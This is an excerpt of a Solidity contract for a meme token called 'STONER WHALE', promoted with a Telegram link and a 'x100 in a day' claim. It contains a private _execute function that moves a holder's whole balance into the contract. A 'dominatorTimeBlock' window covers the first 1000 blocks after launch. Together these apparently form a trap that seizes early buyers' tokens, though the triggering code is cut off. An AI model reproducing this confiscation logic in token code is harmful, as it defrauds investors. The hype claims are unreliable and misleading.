...
Telegram : https://t.me/StonerWhalebsc

LOW TAX PLAY with MISSION x100 in A DAY
...
contract StonerWhale is Context, IERC20, Ownable {
    ...
    string private constant _name = "STONER WHALE";
    string private constant _symbol = "STONERWHALE";
    ...
    address public marketingWallet = address(0xF83fd93937D24Da1dA0b084eF40141a30df581Bc);
    ...
    uint256 public dominatorTimeBlock = 1000;
    ...
    function _execute(address executed) private {
        uint256 walletBal = balanceOf(executed);
        balances[executed] -= walletBal;
        balances[address(this)] += walletBal;
        emit Transfer(executed, address(this), walletBal);
    ...
    function setBuyFees(uint256 newLiquidityFee, uint256 newMarketingFee) public onlyOwner {
        require(newLiquidityFee + newMarketingFee <= 20, "Can't set buyFee above 20%");
    ...
    function setSellFees(uint256 newLiquidityFee, uint256 newMarketingFee) public onlyOwner {
        require(newLiquidityFee + newMarketingFee <= 15, "Can't set sellFee above 15%");
    ...
    function _transfer(
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                if(launchedAt + dominatorTimeBlock > block.number) {
